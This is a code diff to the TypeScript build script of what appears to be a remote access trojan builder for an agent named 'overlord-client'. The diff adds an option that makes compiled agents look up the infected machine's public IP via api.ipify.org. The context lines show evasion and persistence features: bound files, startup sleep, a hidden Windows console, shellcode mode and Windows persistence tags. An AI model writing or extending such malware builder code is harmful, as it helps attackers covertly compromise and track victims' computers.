@@ -113,6 +113,7 @@ type BuildProcessConfig = {
   solAddress?: string;
   solRpcEndpoints?: string;
   iosBundleId?: string;
+  fetchPublicIP?: boolean;
 };
 
 
@@ -831,6 +832,12 @@ func runBoundFiles() {
         sendToStream({ type: "output", text: `Startup sleep: ${config.sleepSeconds}s\n`, level: "info" });
       }
 
+      if (config.fetchPublicIP) {
+        const publicIPFlag = "-X overlord-client/cmd/agent/config.DefaultFetchPublicIP=true";
+        ldflags = ldflags ? `${ldflags} ${publicIPFlag}` : publicIPFlag;
+        sendToStream({ type: "output", text: "Public IP lookup enabled (api.ipify.org)\n", level: "info" });
+      }
+
       if (config.hideConsole && os === "windows") {
         const hideConsoleFlag = "-H=windowsgui";
         ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
@@ -926,6 +933,7 @@ func runBoundFiles() {
         if (hasBoundFiles) baseTags.push("hasbinder");
         if (isIosTarget) baseTags.push("ios_target");
         if (config.shellcodeConsole && isShellcodeMode && os === "windows") baseTags.push("shellcode_console");
+        if (config.fetchPublicIP) baseTags.push("fetch_public_ip");
 
         // Windows persistence tags (omitted in shellcode mode — handled by two-pass below)
         const winPersistTags: string[] = [];
